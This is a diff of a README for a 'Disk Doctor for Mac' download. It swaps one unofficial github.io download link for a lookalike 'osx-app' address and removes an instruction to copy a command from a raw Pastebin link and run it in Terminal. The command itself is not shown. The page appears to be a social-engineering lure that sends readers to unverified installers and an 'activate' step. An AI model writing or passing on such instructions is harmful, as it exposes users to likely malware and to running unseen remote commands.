@@ -8,28 +8,18 @@
 
 <div align="center">
 
-[![📥 Download Disk Doctor Mac](https://img.shields.io/badge/📥_Download_Disk_Doctor_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/diskdoctor)
+[![📥 Download Disk Doctor Mac](https://img.shields.io/badge/📥_Download_Disk_Doctor_for_Mac-blue?style=for-the-badge&logo=apple)](https://osx-app.github.io/.github/diskdoctor)
 
 </div>
 
----
+---  
 
-## Installation via .dmg:
+# Installation Instructions  
 
-1. Download the `.dmg` installer using the button above.  
-2. Open it and drag **Disk Doctor** into your Applications folder.  
-3. Launch the app and allow it to scan your Mac for unnecessary files.  
-4. Start optimizing your system storage.  
+1. Go To The Website Using The Button Above.  
+2. Follow The On-Screen Steps To Install And Activate Disc Doctor On Your Device.  
 
-## Installation via a command in the terminal:
-
-1. Go to the Pastebin link below and copy the command:  
-
-   https://pastebin.com/raw/eLHGVBf8  
-
-2. Open your terminal, paste the command, and run it.  
-
----
+---  
 
 ## What is Disk Doctor for Mac?  
 
